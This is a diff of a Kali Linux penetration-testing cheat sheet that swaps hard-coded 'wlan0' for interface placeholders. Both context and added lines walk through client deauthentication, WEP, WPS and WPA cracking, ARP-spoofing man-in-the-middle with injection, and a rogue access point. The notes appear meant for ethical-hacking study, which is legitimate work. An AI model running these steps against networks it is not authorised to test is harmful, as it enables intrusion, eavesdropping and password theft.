@@ -2,7 +2,7 @@
 
 Useful commands in Kali Linux for penetration testing and ethical hacking
 
-## Basic Linux commands: Device information
+## Helpful Linux Commands
 
 1. zip a file: `tar czvf <filename>`
 2. unzip file: `tar xzvf <filename>`
@@ -23,7 +23,7 @@ Useful commands in Kali Linux for penetration testing and ethical hacking
 
 Discover wireless networks within range:
 ```bash
-airodump-ng wlan0
+airodump-ng <infterface>
 ```
 
 To sniff packets in the selected network: 
@@ -40,17 +40,17 @@ View the .cap file in ```wireshark test.cap```
 Disconnect any client fromm any network: 
 
 ```bash
-aireplay-ng --dauth <NumOfPackets> -a <NetworkMacaddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface-wlan0>
+aireplay-ng --dauth <NumOfPackets> -a <NetworkMacAddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface>
 ```
 ## WEP Cracking
 
 1. Capture a large number of packets with airodump-ng
 ```bash
-airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
+airodump-ng --bssid <NetworkMacAddress> --channel <channel> --write <FileName> <interface> 
 ```
 2. Analyse the captured packets and crack the key with aircrack-ng
 ```bash
-aircrack-ng .capfile
+aircrack-ng <.capfile>
 ```
 3. output: KEY IS FOUND
 4. Remove the colons from the key and use it as password
@@ -68,15 +68,15 @@ This attack injects packets in the network.
 If WPS is Enable:
 1. Displays networks with WPS enabled
 ```bash 
-wash --interface wlan0
+wash --interface <interface>
 ```
 2. 
 ```bash
-aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <wlan0>
+aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <interface>
 ```
 3. Run Reaver in another terminal window
 ```bash
-reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <wlan0> -vvv --no-associate
+reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <interface> -vvv --no-associate
 ```
 **NOTE: if bug error, then download older version of reaver and run ./reaver ____**
 
@@ -85,7 +85,7 @@ reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <wlan0> 
 If WPS is disable:
 1. Capture Handshake between devices
 ```bash
-airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <wlan0>
+airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <interface>
 ```
 - Wait for the handshake
 - wait for a new client or disconnect a client with a fake auth attack. 
@@ -101,7 +101,7 @@ crunch 6 8 abc12 -o test.txt
 ```
 2. Wordlist attack 
 ```bash
-aircrack-ng <handshake.cap> -w <text.txt>
+aircrack-ng <handshake.cap> -w <WordListFile.txt>
 ```
 
 ## Man In The Middle Attack (MITM)
@@ -158,11 +158,11 @@ mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inje
 1. Download tool `apt-get intall manatoolkit`
 2. `start-nat-simple.sh`
 3. Edit the settings: `leafpad /etc/mana-toolkit/hostapd-mana.conf`
-- Change interface = wlan0
+- Change interface = <interface> (wlan0)
 - ssid = name of the fake network
 4. Edit: `leafpad /usr/share/mana-toolkit/run-mana/start-nat/simple.sh`
 - upstream = eth0
-- phy = wlan0
+- phy = <interface> (wlan0)
 5. start fake AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 6. Test it with phone or other machine, NOT host machine. 
 
